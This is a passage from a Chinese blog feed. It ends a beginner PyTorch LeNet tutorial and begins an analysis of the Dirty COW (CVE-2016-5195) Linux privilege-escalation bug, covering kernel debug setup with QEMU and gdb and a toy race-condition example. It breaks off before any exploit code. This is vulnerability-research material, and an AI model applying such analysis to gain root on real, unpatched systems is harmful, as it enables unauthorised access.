running_loss / <span class="number">1000</span>, accuracy))</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;%f s&#x27;</span> % (time.perf_counter() - time_start))</span><br><span class="line">                running_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Finished Training&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    save_path = <span class="string">&#x27;./Lenet.pth&#x27;</span></span><br><span class="line">    torch.save(net.state_dict(), save_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里为了方便观察，我将输出的周期调整到1000次，观察一下二者的区别</p><p>gpu</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220616133814113.png" alt="image-20220616133814113"></p><p>cpu</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220616134807041.png" alt="image-20220616134807041"></p><p>比较令人费解的是二者的时间差距并不明显，按理说gpu应该比cpu快很多倍的。笔者十分确信它们就是cpu与gpu的结果，因为我在跑训练的时候观察任务管理器确实是分别使用了cpu与gpu的资源。（笔者这里使用的cpu为5900x，gpu为3060，不晓得是什么问题）</p><h5 id="3-2-3-5-predict-py"><a href="#3-2-3-5-predict-py" class="headerlink" title="3.2.3.5 predict.py"></a>3.2.3.5 predict.py</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> LeNet</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    transform = transforms.Compose(</span><br><span class="line">        [transforms.Resize((<span class="number">32</span>, <span class="number">32</span>)),</span><br><span class="line">         transforms.ToTensor(),</span><br><span class="line">         transforms.Normalize((<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>), (<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>))])</span><br><span class="line"></span><br><span class="line">    classes = (<span class="string">&#x27;plane&#x27;</span>, <span class="string">&#x27;car&#x27;</span>, <span class="string">&#x27;bird&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;deer&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;frog&#x27;</span>, <span class="string">&#x27;horse&#x27;</span>, <span class="string">&#x27;ship&#x27;</span>, <span class="string">&#x27;truck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    net = LeNet()</span><br><span class="line">    net.load_state_dict(torch.load(<span class="string">&#x27;Lenet.pth&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        im = Image.<span class="built_in">open</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;.jpeg&#x27;</span>)</span><br><span class="line">        im = transform(im)  <span class="comment"># [C, H, W]</span></span><br><span class="line">        im = torch.unsqueeze(im, dim=<span class="number">0</span>)  <span class="comment"># [N, C, H, W]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            outputs = net(im)</span><br><span class="line">            predict = torch.<span class="built_in">max</span>(outputs, dim=<span class="number">1</span>)[<span class="number">1</span>].numpy()</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;.jpeg： &#x27;</span> + classes[<span class="built_in">int</span>(predict)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里测试了三张图片，其中两张识别错误了，说明这个状态字典还是比较年轻啊=）</p><p>测试结果</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220616142113595.png" alt="image-20220616142113595"></p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/1.jpeg" alt="1"></p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/2.jpeg" alt="2"></p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/3.jpeg" alt="3"></p><h5 id="3-2-3-6-遇到的问题"><a href="#3-2-3-6-遇到的问题" class="headerlink" title="3.2.3.6 遇到的问题"></a>3.2.3.6 遇到的问题</h5><h6 id="1-iter-next为什么有两个返回值与其作用（）"><a href="#1-iter-next为什么有两个返回值与其作用（）" class="headerlink" title="1 iter.next为什么有两个返回值与其作用（）"></a><del>1 iter.next为什么有两个返回值与其作用（）</del></h6><p><del>在笔者分析代码的过程中，train.py使用到了iter函数，最开始我认为它与正常的python迭代器别无二致，但观察第二行代码发现，它的next方法存在两个返回值，这勾起了我的兴趣，调试到对应代码行，查看它的类型，果然是重新实现了的。</del></p><p><del><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220615171652013.png" alt="image-20220615171652013"></del></p><p><del>python内置的迭代器一般情况是list_iterator，而这里则是_SingleProcessDataLoaderIter，看下pytorch源码</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_SingleProcessDataLoaderIter</span>(<span class="params">_BaseDataLoaderIter</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, loader</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(_SingleProcessDataLoaderIter, self).__init__(loader)</span><br><span class="line">        <span class="keyword">assert</span> self._timeout == <span class="number">0</span></span><br><span class="line">        <span class="keyword">assert</span> self._num_workers == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self._dataset_fetcher = _DatasetKind.create_fetcher(</span><br><span class="line">            self._dataset_kind, self._dataset, self._auto_collation, self._collate_fn, self._drop_last)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_next_data</span>(<span class="params">self</span>):</span></span><br><span class="line">        index = self._next_index()  <span class="comment"># may raise StopIteration</span></span><br><span class="line">        data = self._dataset_fetcher.fetch(index)  <span class="comment"># may raise StopIteration</span></span><br><span class="line">        <span class="keyword">if</span> self._pin_memory:</span><br><span class="line">            data = _utils.pin_memory.pin_memory(data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p><del>额，只返回了data，做下测试。</del></p><p><del><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220615172651788.png" alt="image-20220615172651788"></del></p><p><del>原来返回值可以存在多个，我是个智障。。。。。。。。</del></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本篇文章简单介绍了人工智能、机器学习、神经网络与深度学习的含义以及其内部包含的一些基础性的概念，并通过一个demo了解了下卷积神经网络的简单实现。算是一个由AI初学者从工业界的视角简单记录了下学习AI的过程。</p><p>这次的AI学习之旅源于公司内部的技术分享，学习的过程中发现，原来学科交叉可以碰撞出如此剧烈的思维火花，如“卷积神经网络”就集合了生物学，数学与计算机学。让机器具有深度学习的能力，目前在CV领域达到开枝散叶的成功，对人的日常生活影响确实是巨大的。技术确实是丰富了生活，但是我却不由得联想到了公民隐私泄露相关的的问题，软件商非法获取手机的权限：获取相册权限通过CV模型来描绘用户画像，或者剪切板以及录音等权限通过nlp模型直接定位用户喜好，这可能是科技发展的另一面吧。不过机器学习带给我的震撼还是无与伦比的，说不定之后的智能机器人真的可以解放大量的生产力，或者我们想象不到的更多事情。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><ol><li><a class="link"   href="https://zhuanlan.zhihu.com/p/65472471" >神经网络15分钟入门！足够通俗易懂了吧<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://www.bilibili.com/video/BV1bx411M7Zx" >【官方双语】深度学习之神经网络的结构 Part 1 ver 2.0<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/77494679" >Anaconda、TensorFlow安装和Pycharm配置详细教程！<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/ECHOSON/article/details/118420968" >2021年Windows下安装GPU版本的Tensorflow和Pytorch<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://juejin.cn/post/6844904198010568717" >读懂一个 demo，入门机器学习<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://download.pytorch.org/whl/torch_stable.html" >pytorch download<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/weixin_41803482/article/details/109231249" >解决torch.cuda.is_available()返回结果为False<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/32472241" >零基础理解卷积神经网络<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/227774699" >从零开始实现卷积神经网络CNN<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/Chen_Swan/article/details/105486854" >池化层详细介绍<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/77040467" >深度学习入门之池化层<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/qq_37541097/article/details/103482003" >深度学习在图像处理中的应用（tensorflow2.4以及pytorch1.10实现）<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://www.bilibili.com/video/BV1M7411M7D2/" >1.2 卷积神经网络基础补充<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://www.bilibili.com/video/BV187411T7Ye" >2.1 pytorch官方demo(Lenet)<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://zhuanlan.zhihu.com/p/116181964" >卷积神经网络之Lenet<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.csdn.net/qq_42012782/article/details/124296057" >pytorch图像分类篇：pytorch官方demo实现一个分类器(LeNet)<i class="fas fa-external-link-alt"></i></a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AI基础&quot;&gt;&lt;a href=&quot;#AI基础&quot; class=&quot;headerlink&quot; title=&quot;AI基础&quot;&gt;&lt;/a&gt;AI基础&lt;/h1&gt;&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="技术研究" scheme="https://fa1lr4in.github.io/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="基础技术" scheme="https://fa1lr4in.github.io/tags/%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    
    <category term="AI" scheme="https://fa1lr4in.github.io/tags/AI/"/>
    
    <category term="人工智能" scheme="https://fa1lr4in.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
    <category term="机器学习" scheme="https://fa1lr4in.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://fa1lr4in.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="神经网络" scheme="https://fa1lr4in.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195 dirtycow linux本地提权漏洞分析</title>
    <link href="https://fa1lr4in.github.io/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://fa1lr4in.github.io/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-05-10T08:26:18.000Z</published>
    <updated>2022-05-10T08:27:17.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2016-5195-dirtycow-linux本地提权漏洞分析"><a href="#CVE-2016-5195-dirtycow-linux本地提权漏洞分析" class="headerlink" title="CVE-2016-5195 dirtycow linux本地提权漏洞分析"></a>CVE-2016-5195 dirtycow linux本地提权漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>脏牛（Dirty COW）漏洞名称源于linux内核的写时复制（Copy-on-Write）的首字母缩写。该漏洞于2016年10月18日由Phil Oester提交，并于2016年10月20日由Linus修复。该漏洞影响2.6.22到4.8.3, 4.7.9, 4.4.26之前的版本。影响版本可以<a class="link"   href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions" >参考<i class="fas fa-external-link-alt"></i></a></p><p>该漏洞是Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。从而修改任意文件，甚至低权限用户通过该漏洞可提升至root权限。</p><p>该漏洞为笔者在分析DirtyPipe后重温经典漏洞，该漏洞影响范围较大。参考了网络上公开的一些分析，发现有许多分析比较混乱，看完给人一头雾水的感觉。笔者尽量用简介与清晰的描述完成此篇分析。</p><p>比较推荐一篇精炼的<a class="link"   href="https://atum.li/2016/10/25/dirtycow/" >分析<i class="fas fa-external-link-alt"></i></a>。没有废话，全程干货。还有<a class="link"   href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/" >该文章<i class="fas fa-external-link-alt"></i></a>写的也是不错的。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="零、前言"><a href="#零、前言" class="headerlink" title="零、前言"></a>零、前言</h3><p>前置知识非必须，如果读者十分了解相关的机制，则可以直接查看漏洞分析的部分，笔者会用尽量精炼的语言和清晰的逻辑来阐述相关漏洞原理。</p><h3 id="一、linux内核调试环境编译"><a href="#一、linux内核调试环境编译" class="headerlink" title="一、linux内核调试环境编译"></a>一、linux内核调试环境编译</h3><p>搭建过程主要参考了<a class="link"   href="https://blog.csdn.net/hellochristie/article/details/78230734" >该文章<i class="fas fa-external-link-alt"></i></a>。</p><h4 id="0、严重的错误"><a href="#0、严重的错误" class="headerlink" title="0、严重的错误"></a>0、严重的错误</h4><p>在ubuntu20.04运行如下的安装步骤时会出现如下问题</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220419142819926.png" alt="image-20220419142819926"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Booting from ROM...</span><br><span class="line">early console <span class="keyword">in</span> decompress_kernel</span><br><span class="line">input_data: 0x000000000191524d</span><br><span class="line">input_len: 0x00000000005e4b5c</span><br><span class="line">output: 0x0000000001000000</span><br><span class="line">output_len: 0x0000000000ee88b8</span><br><span class="line">run_size: 0x0000000000ff4000</span><br><span class="line"></span><br><span class="line">Decompressing Linux... Parsing ELF...</span><br></pre></td></tr></table></figure><p>在qemu运行时将会一直卡在上面的界面上。</p><p>经过较长时间的寻找，在<a class="link"   href="https://vccolombo.github.io/cybersecurity/linux-kernel-qemu-stuck/" >该博客<i class="fas fa-external-link-alt"></i></a>中寻找到了解决方案，遂尝试从ubuntu18.04进行漏洞实验，环境搭建成功。</p><h4 id="1、源码获取"><a href="#1、源码获取" class="headerlink" title="1、源码获取"></a>1、源码获取</h4><p>首先拖源码与补丁（这里也可以下载其他版本）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.1.tar.gz</span><br><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/patch-4.4.1.xz</span><br><span class="line">tar zxvf linux-4.4.1.tar.gz </span><br><span class="line">xz -d patch-4.4.1.xz | patch -p1<span class="comment"># 这里没有输出代表执行成功</span></span><br></pre></td></tr></table></figure><h4 id="2、内核编译"><a href="#2、内核编译" class="headerlink" title="2、内核编译"></a>2、内核编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1</span><br><span class="line">make x86_64_defconfig   <span class="comment"># 加载默认config</span></span><br><span class="line">make menuconfig<span class="comment"># 自定义config</span></span><br></pre></td></tr></table></figure><p>要进行打断点调试，需要关闭系统的随机化和开启调试信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Processor type and features  ---&gt; </span><br><span class="line">    [ ] Build a relocatable kernel                                               </span><br><span class="line">        [ ]  Randomize the address <span class="keyword">of</span> the kernel image (KASLR) (NEW) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Kernel hacking  ---&gt;</span><br><span class="line">    Compile-time checks and compiler options  ---&gt;  </span><br><span class="line">        [*] Compile the kernel <span class="keyword">with</span> debug info                                                                  </span><br><span class="line">        [ ]   Reduce debugging information                                                                      </span><br><span class="line">        [ ]   Produce split debuginfo <span class="keyword">in</span> .dwo files                                                             </span><br><span class="line">        [*]   Generate dwarf4 debuginfo                                         </span><br><span class="line">        [*]   Provide GDB scripts <span class="keyword">for</span> kernel debugging</span><br></pre></td></tr></table></figure><p>之后进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j32</span><br></pre></td></tr></table></figure><p>如果遇到编译错误<code>cc1: error: code model kernel does not support PIC mode</code>，则在MakeFile中的KBUILD_CFLAGS选项中加入<code>-fno-pie</code></p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220411110701269.png" alt="image-20220411110701269"></p><p>之后在进行make即可。</p><h4 id="3、加载文件系统镜像"><a href="#3、加载文件系统镜像" class="headerlink" title="3、加载文件系统镜像"></a>3、加载文件系统镜像</h4><p>这里可以使用<code>syzkaller</code>的生成脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1</span><br><span class="line">sudo apt-get install debootstrap</span><br><span class="line">wget https://github.com/google/syzkaller/blob/master/tools/create-image.sh -O create-image.sh<span class="comment"># 这里我得到的是一个html页面，最终笔者自行访问页面复制了相关的代码。</span></span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh<span class="comment"># 这里会在当前目录生成 stretch.img</span></span><br></pre></td></tr></table></figure><h4 id="4、启动qemu"><a href="#4、启动qemu" class="headerlink" title="4、启动qemu"></a>4、启动qemu</h4><p>这里的<code>-nographic</code>以及<code>-s</code>一定要加，执行命令后会启动生成的linux系统，并得到一个shell，这里可以不指定-net参数，默认会有一个NAT的网络，可以访问外网。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1 &amp;&amp;</span><br><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-s \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial&quot;</span>\</span><br><span class="line">    -drive file=./stretch.img,format=raw \</span><br><span class="line">    -nographic</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316173537546-16496426175211.png" alt="image-20220316173537546"></p><p>命令行参数如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::1234</span><br><span class="line">-append cmdline use <span class="string">&#x27;cmdline&#x27;</span> as kernel <span class="built_in">command</span> line</span><br><span class="line">-net nic[,macaddr=mac][,model=<span class="built_in">type</span>][,name=str][,addr=str][,vectors=v]</span><br><span class="line">                configure or create an on-board (or machine default) NIC and</span><br><span class="line">                connect it to hub 0 (please use -nic unless you need a hub) </span><br><span class="line">-enable-kvm 开启kvm，这里不要加，否则调试时会直接跳转到__sysvec_apic_timer_interrupt</span><br></pre></td></tr></table></figure><h4 id="5、gdb调试"><a href="#5、gdb调试" class="headerlink" title="5、gdb调试"></a>5、gdb调试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-4.4.1</span><br><span class="line">gdb vmlinux</span><br><span class="line">gef➤  target remote:1234<span class="comment"># 连接到远程调试接口</span></span><br><span class="line"><span class="comment"># 后面就可以正常进行调试了</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316174104667.png" alt="image-20220316174104667"></p><h3 id="二、条件竞争漏洞"><a href="#二、条件竞争漏洞" class="headerlink" title="二、条件竞争漏洞"></a>二、条件竞争漏洞</h3><h4 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h4><p><a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/" >race-condition<i class="fas fa-external-link-alt"></i></a>中文一般称为条件竞争，指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现bug。这个术语最初来自于两个电信号互相竞争来影响输出结果。</p><h4 id="2、触发条件"><a href="#2、触发条件" class="headerlink" title="2、触发条件"></a>2、触发条件</h4><p>由于目前的系统中大量采用并发编程，经常对资源进行共享，往往会产生条件竞争漏洞。当一个软件的运行结果依赖于进程或者线程的顺序时，就可能会出现条件竞争。简单考虑一下，可以知道条件竞争需要如下的<strong>条件</strong>：</p><ul><li>并发，即至少存在两个并发执行流。这里的执行流包括线程，进程，任务等级别的执行流。</li><li>共享对象，即多个并发流会访问同一对象。<strong>常见的共享对象有共享内存，文件系统，信号。一般来说，这些共享对象是用来使得多个程序执行流相互交流。</strong>此外，我们称访问共享对象的代码为<strong>临界区</strong>。在正常写代码时，这部分应该加锁。</li><li>改变对象，即至少有一个控制流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。</li></ul><h4 id="3、例子"><a href="#3、例子" class="headerlink" title="3、例子"></a>3、例子</h4><p>由于在并发时，执行流的不确定性很大，条件竞争相对<strong>难察觉</strong>，并且在<strong>复现和调试方面会比较困难</strong>。这给修复条件竞争也带来了不小的困难。</p><p>条件竞争造成的影响也是多样的，轻则程序异常执行，重则程序崩溃。如果条件竞争漏洞被攻击者利用的话，很有可能会使得攻击者获得相应系统的特权。</p><p>这里举一个简单的例子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> counter;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">IncreaseCounter</span><span class="params">(<span class="keyword">void</span> *args)</span> </span>&#123;</span><br><span class="line">  counter += <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">0.1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">pthread_self</span>(),</span><br><span class="line">         counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">pthread_create</span>(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">pthread_join</span>(p[i], <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般来说，我们可能希望按如下方式输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  005race_condition ./example1</span><br><span class="line">Thread 1859024640 has counter value 1</span><br><span class="line">Thread 1841583872 has counter value 2</span><br><span class="line">Thread 1832863488 has counter value 3</span><br><span class="line">Thread 1824143104 has counter value 4</span><br><span class="line">Thread 1744828160 has counter value 5</span><br><span class="line">Thread 1736107776 has counter value 6</span><br><span class="line">Thread 1727387392 has counter value 7</span><br><span class="line">Thread 1850304256 has counter value 8</span><br><span class="line">Thread 1709946624 has counter value 9</span><br><span class="line">Thread 1718667008 has counter value 10</span><br></pre></td></tr></table></figure><p>但是，由于条件竞争的存在，最后输出的结果往往不尽人意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  005race_condition ./example1</span><br><span class="line">Thread 1417475840 has counter value 2</span><br><span class="line">Thread 1408755456 has counter value 2</span><br><span class="line">Thread 1391314688 has counter value 8</span><br><span class="line">Thread 1356433152 has counter value 8</span><br><span class="line">Thread 1365153536 has counter value 8</span><br><span class="line">Thread 1373873920 has counter value 